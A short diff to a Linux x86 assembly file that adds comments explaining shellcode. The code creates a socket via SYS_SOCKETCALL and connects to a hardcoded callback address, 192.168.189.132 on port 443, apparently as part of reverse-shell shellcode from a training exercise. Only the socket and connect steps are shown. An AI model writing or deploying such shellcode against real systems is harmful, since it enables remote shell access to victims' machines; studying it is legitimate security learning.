@@ -6,18 +6,18 @@ _start:
 	push eax
 	push eax
 	
-	push 0x84bda8c0	; 192.168.189.132 = 3232284036 = 0xC0A8BD84
-	mov bx, 0x0bb01 ; 443 = 0x1bb
-	shl ebx, 16
-	add bl, 0x02	
-	push ebx
+	push 0x84bda8c0		; 192.168.189.132 = 3232284036 = 0xC0A8BD84
+	mov bx, 0x0bb01 	; 443 = 0x1bb
+	shl ebx, 16		; Pass port to higher word in register
+	add bl, 0x02		; AF_INET = 2
+	push ebx		; ebx = 0xbb010002
 	
 	push eax
 	push 0x01
 	push 0x02
 		
-	mov al, 0x66
-	xor ebx, ebx
+	mov al, 0x66		; SYS_SOCKETCALL
+	xor ebx, ebx	
 	mov bl, 0x01
 	mov ecx, esp
 	int 0x80
@@ -27,7 +27,7 @@ _start:
 	push ebx
 	push eax
 	xor eax, eax
-	mov al, 0x66
+	mov al, 0x66		; SYS_SOCKETCALL
 	xor ebx, ebx
 	mov bl, 0x03
 	mov ecx, esp
